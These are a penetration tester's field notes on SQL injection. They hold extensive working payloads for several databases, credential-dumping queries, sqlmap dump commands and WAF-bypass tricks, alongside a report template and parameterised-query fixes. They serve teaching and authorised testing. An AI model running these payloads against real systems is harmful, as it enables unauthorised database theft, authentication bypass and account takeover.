# SQL Injection — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Injection — OWASP A03:2021 | Previously A1 for 10 consecutive years
>
> **Severity:** Critical (CVSS 9.8) — Full database compromise, authentication bypass, potential RCE
>
> **Real-world impact:** In enterprise engagements, SQLi is responsible for more critical findings than any other single vulnerability class I've tested.

---

## 🧠 Why This Write-Up Exists

I've been breaking enterprise applications for over 5 years at Infosys. SQL Injection has appeared in nearly every engagement — not always in obvious login forms, but buried in API endpoints, reporting modules, admin panels, and internal tools that developers assumed were "safe" because they weren't public-facing.

This document is not a beginner's introduction. It is the field notes I use during real engagements — the techniques, payloads, thought process, and reporting structure I apply against enterprise web applications and APIs every day.

If you are learning SQLi for the first time, start with PortSwigger's labs. If you are moving from theory to real-world testing, this is the document you need.

---

## 📖 What Is SQL Injection?

SQL Injection occurs when **user-controlled input is concatenated directly into a SQL query** without sanitisation or parameterisation. The attacker's input is interpreted as SQL syntax, not data.

```sql
-- What the developer wrote:
SELECT * FROM users WHERE username = '$input' AND password = '$pass';

-- What the attacker sends as username:
' OR '1'='1'--

-- What the database executes:
SELECT * FROM users WHERE username = '' OR '1'='1'-- AND password = '';
-- Result: returns ALL users. Authentication bypassed.
```

**Why it still exists in enterprise environments in 2025:**
- Legacy codebases using raw query concatenation (I regularly see this in ASP.NET WebForms apps from 2008–2015 still running in production)
- Developers who understand ORMs for main features but drop to raw SQL for custom reports or admin functionality
- Third-party components and integrations that bypass the main application's security controls
- APIs that reuse backend query builders without input validation

---

## 🔍 Phase 1 — Discovery: Where to Look in Enterprise Applications

The biggest mistake junior testers make is only testing login forms. In enterprise environments, the highest-value SQLi findings are almost never on the login page.

### High-Value Injection Points

| Location | Why It's Often Missed |
|---|---|
| **Report generation endpoints** | Developers assume internal tools don't need validation |
| **Search & filter parameters** | Dynamic queries built from multiple user inputs |
| **API endpoints** — `?id=`, `?user=`, `?ref=` | Often lack WAF coverage that the frontend has |
| **Sorting and ordering params** — `?sort=name&order=asc` | Direct column name injection, parameterisation rarely applied here |
| **HTTP Headers** — `X-Forwarded-For`, `User-Agent`, `Referer` | Logged to DB, often unvalidated |
| **Cookie values** | Session tokens and preference values passed to queries |
| **JSON body parameters** | API-first backends often trust JSON input implicitly |
| **File name / export parameters** | PDF/CSV export features are consistently vulnerable |
| **Second-order injection points** | Stored values used in queries elsewhere (registration → password reset flow) |

### Initial Detection Payloads

Test these one at a time. Watch for: error messages, response time changes, different content length, blank responses.

```sql
'
''
`
')
"))
' OR 1=1--
' OR '1'='1
1' ORDER BY 1--
1' ORDER BY 50--    ← intentionally high — error reveals column count
' AND SLEEP(0)--    ← baseline
' AND SLEEP(5)--    ← confirms time-based if 5s delay
```

**In Burp Suite:** Send the request to Intruder, payload position on the parameter value, use the above as your payload list. Watch the response length column for anomalies.

---

## 💥 Phase 2 — Exploitation: The 5 Types

### Type 1 — Error-Based SQLi

The database returns errors that leak information. Most common in older ASP.NET / PHP apps with debug mode on or verbose error handling.

```sql
-- MySQL — extract version via error
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL — extract version via error (very common in enterprise .NET apps)
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
'; SELECT * FROM nonexistent_table--

-- Extract current DB user (tells you privilege level)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT current_user())))--
```

> **Enterprise context:** I find MSSQL error-based SQLi frequently in internal .NET applications that were built with error details enabled in web.config. The development team enabled `<customErrors mode="Off"/>` during testing and never re-enabled it in production.

---

### Type 2 — Union-Based SQLi

Appends a second SELECT statement to extract data from other tables. Requires knowing the number of columns and compatible data types.

```sql
-- Step 1: Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← keep incrementing until you get an error

-- Step 2: Find injectable columns (look for visible output in response)
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- MSSQL equivalent (enterprise .NET apps)
' UNION SELECT NULL,name,NULL FROM sys.tables--
' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--
```

---

### Type 3 — Blind Boolean SQLi

No visible output. The application returns different responses for true vs false conditions. Slow but reliable.

```sql
-- Confirm Boolean injection exists
' AND 1=1--     ← true condition — normal response
' AND 1=2--     ← false condition — different response (empty, error, redirect)

-- Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
-- ... continue until true

-- Binary search approach (faster):
' AND ASCII(SUBSTRING(database(),1,1))>96--   ← is first char ASCII > 96?
' AND ASCII(SUBSTRING(database(),1,1))>109--  ← narrow down
' AND ASCII(SUBSTRING(database(),1,1))=109--  ← confirm: 'm'

-- Extract user credentials (once you have table/column names)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5'--
```

> **Enterprise context:** Blind Boolean is the most common type I encounter in modern enterprise applications that suppress errors correctly but still have underlying injection. It's tedious manually but SQLMap handles it cleanly. I always confirm manually first before running automation.

---

### Type 4 — Time-Based Blind SQLi

No response difference at all. Inject a delay to confirm vulnerability. Use when boolean gives identical responses.

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='m',SLEEP(5),0)--

-- MSSQL (most common in enterprise .NET environments)
'; WAITFOR DELAY '0:0:5'--
'; IF(1=1) WAITFOR DELAY '0:0:5'--
'; IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)=1--
```

> **Enterprise context:** I rely on time-based injection frequently when testing API endpoints that return identical 200 responses regardless of input. The 5-second delay is unmistakable in Burp's response time column.

---

### Type 5 — Second-Order SQLi

The payload is stored safely in the database, then retrieved and used unsafely in a different query later. This is the hardest type to find and the most dangerous — WAFs and automated scanners almost always miss it.

**Classic pattern I've exploited:**

```
Step 1 — Register with username:   admin'--
         → Stored safely in DB as: admin'--

Step 2 — Trigger password change. The backend runs:
         UPDATE users SET password='new' WHERE username='admin'--'
         → The '--  comments out the AND clause
         → Result: admin's password is changed, not yours

Step 3 — Log in as admin with your new password.
```

**Why this matters in enterprise apps:**

```
Vulnerable flows:
- Registration → Profile update
- Username stored → Used in "Change password" query
- Email stored → Used in "Reset link" query
- Search history saved → Used in "Saved searches" query
- Product name stored → Used in "Order history" report query
```

> **Enterprise context:** I discovered a second-order SQLi in a large enterprise internal HR application. The employee ID field was stored safely at registration, but when the payroll report module constructed dynamic SQL using that stored value, the injection fired. The module was written by a different team 3 years after the registration module — nobody connected the two code paths. This is exactly why threat modelling across the full data flow matters.

---

## 🗂️ Phase 3 — Enumeration: Extracting What Matters

Once injection is confirmed, systematic enumeration determines the real business impact.

```sql
-- ═══ MySQL Enumeration ═══

-- Current DB user and permissions
SELECT current_user();
SELECT user, host, authentication_string FROM mysql.user;

-- All databases
SELECT schema_name FROM information_schema.schemata;

-- Tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

-- Columns in target table
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';

-- Dump credentials
SELECT username, password, email FROM users LIMIT 10;

-- Check for file read/write privileges (RCE escalation path)
SELECT file_priv FROM mysql.user WHERE user=current_user();


-- ═══ MSSQL Enumeration (enterprise .NET apps) ═══

-- Current user and role
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');   ← if 1, you have full server access

-- All databases
SELECT name FROM sys.databases;

-- Tables
SELECT name FROM sys.tables;

-- Columns
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users');

-- Check if xp_cmdshell is available (OS command execution)
SELECT value FROM sys.configurations WHERE name='xp_cmdshell';
```

---

## ⚙️ SQLMap — Enterprise Usage

I use SQLMap to confirm and automate after manual verification. Never run SQLMap blind on a client environment without explicit scope approval — it generates significant noise.

```bash
# Basic detection
sqlmap -u "https://target.com/api/users?id=1" --batch

# POST request (API JSON body)
sqlmap -u "https://target.com/api/search" \
  --data='{"query":"test","page":1}' \
  --headers="Content-Type: application/json" \
  --batch

# Authenticated scan (with session cookie from Burp)
sqlmap -u "https://target.com/report?ref=100" \
  --cookie="session=eyJhbG..." \
  --batch

# Enumerate databases only
sqlmap -u "https://target.com/?id=1" --dbs --batch

# Dump specific table (once you know DB and table name)
sqlmap -u "https://target.com/?id=1" \
  -D production_db -T users \
  --dump --batch

# Time-based only (when other techniques fail or are too noisy)
sqlmap -u "https://target.com/?id=1" \
  --technique=T --time-sec=3 --batch

# WAF bypass tamper scripts
sqlmap -u "https://target.com/?id=1" \
  --tamper=space2comment,randomcase,between \
  --batch

# Burp proxy — route SQLMap through Burp for full logging
sqlmap -u "https://target.com/?id=1" \
  --proxy=http://127.0.0.1:8080 --batch
```

---

## 🚧 WAF Bypass Techniques

Enterprise applications often sit behind WAFs (Imperva, Cloudflare, AWS WAF, F5). These are the techniques I apply when standard payloads are blocked.

```sql
-- Whitespace substitution
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users   ← tab character
SELECT%0ausername%0afrom%0ausers   ← newline

-- Case randomisation
SeLeCt UsErNaMe FrOm UsErS

-- Keyword fragmentation (MySQL)
SE/**/LECT

-- Inline comments between keywords
SELECT /*!username*/ FROM users

-- URL and double encoding
%27 = '    %20 = space    %23 = #
%2527 = ' (double encoded — bypasses single-decode WAFs)

-- Scientific notation for numeric bypasses
id=1e0 UNION SELECT ...
id=1.0 UNION SELECT ...

-- Equivalent operators
AND → &&
OR  → ||
=   → LIKE, REGEXP, IN

-- Null byte injection (older WAFs)
'%00 OR 1=1--

-- HTTP parameter pollution
?id=1&id=' UNION SELECT...
```

---

## 📋 Enterprise Pentest Report Template

This is the structure I use in actual client deliverables. Every field matters.

---

**Finding Title:** SQL Injection — Authenticated Reporting Endpoint

**Severity:** Critical

**CVSS v3.1 Score:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Affected Endpoint:** `GET /api/v2/reports/export?ref_id=<VALUE>`

**Authentication Required:** Yes — Standard user session

---

**Vulnerability Description:**

The `ref_id` parameter in the report export endpoint is vulnerable to SQL injection. User-supplied input is concatenated directly into a SQL query without parameterisation or input validation. An authenticated attacker can manipulate the query to extract arbitrary data from the database, including credentials, PII, and internal business data.

---

**Steps to Reproduce:**

1. Authenticate to the application with a standard user account
2. Navigate to the report export feature and capture the request in Burp Suite
3. Modify the `ref_id` parameter value to: `1' AND SLEEP(5)--`
4. Observe the 5-second response delay — confirms time-based blind SQL injection
5. To demonstrate data extraction, use the payload:
   `1' UNION SELECT NULL,username,password FROM users--`
6. Observe database credentials returned in the response body

---

**Proof of Concept:**

```
Request:
GET /api/v2/reports/export?ref_id=1'+UNION+SELECT+NULL,username,password+FROM+users-- HTTP/1.1
Host: target.enterprise.com
Cookie: session=<valid_session_token>

Response:
HTTP/1.1 200 OK
[...truncated...]
{"data":[{"col1":null,"col2":"admin","col3":"5f4dcc3b5aa765d61d8327de"}]}
```

---

**Business Impact:**

- Full extraction of the user database including credentials and PII
- Potential authentication bypass leading to administrative access
- Exposure of confidential business data stored in the database
- Depending on database user privileges: potential for OS-level command execution

---

**Risk Rating Justification:**

Critical severity is assigned due to the direct path to full database compromise with only standard user privileges. The vulnerability is exploitable remotely with no user interaction required and no special conditions.

---

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | Replace string concatenation with parameterised queries / prepared statements |
| Short-term | Implement input validation — whitelist expected formats (numeric IDs, specific strings) |
| Short-term | Apply principle of least privilege — the database user should have SELECT only on required tables |
| Long-term | Integrate SAST tooling (SonarQube) to catch query concatenation patterns in CI/CD pipeline |
| Long-term | Add DAST scan (OWASP ZAP / Burp DAST) to regression test suite |

---

**Secure Code Pattern (for developer remediation):**

```csharp
// ❌ VULNERABLE — ASP.NET string concatenation
string query = "SELECT * FROM reports WHERE ref_id = " + refId;
SqlCommand cmd = new SqlCommand(query, connection);

// ✅ SECURE — Parameterised query
string query = "SELECT * FROM reports WHERE ref_id = @refId";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@refId", refId);

// ✅ SECURE — Entity Framework (ORM)
var report = context.Reports.Where(r => r.RefId == refId).FirstOrDefault();
```

---

## 🧪 Practice Labs

Sharpen the manual skills before relying on tools:

| Platform | Resource | Why It's Useful |
|---|---|---|
| [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection) | 18 free SQLi labs | Best structured learning path — covers all types |
| [HackTheBox](https://hackthebox.com) | SQL-based machines | Real-world feel, active community |
| [DVWA](https://github.com/digininja/DVWA) | Local lab | Good for testing tool payloads safely |
| [SQLi-labs](https://github.com/Audi-1/sqli-labs) | 75 SQLi scenarios | Covers edge cases and WAF bypass scenarios |

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. The obvious places are already fixed.**
If it's a public-facing login form, the developer has probably already read the OWASP guide. Spend your time on internal APIs, admin panels, reporting modules, and integrations.

**2. Second-order injection wins engagements.**
Automated scanners do not reliably find second-order injection. If you're doing manual testing and understanding data flows, you will find bugs that no tool will ever surface. This is where senior pentesters earn their value.

**3. Confirm manually before you automate.**
SQLMap is a powerful tool that generates significant noise. On a client network, an uncontrolled SQLMap run can impact application performance and trigger incident response. Always confirm the injection point manually and scope your automation carefully.

**4. The report is the deliverable.**
A critical SQLi finding that isn't explained clearly to a developer team gets deprioritised or misunderstood. Write your reports so that a developer who has never thought about security can understand exactly what went wrong, reproduce it, and fix it. That is the actual outcome we are being paid to produce.

**5. Remediation is part of the job.**
I spend as much time advising on parameterised queries and ORM patterns as I do on exploitation. Mentoring developers on the secure code patterns that prevent these vulnerabilities is what reduces the number of vulnerabilities in the next engagement.

---

## 🔗 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQLi Research](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
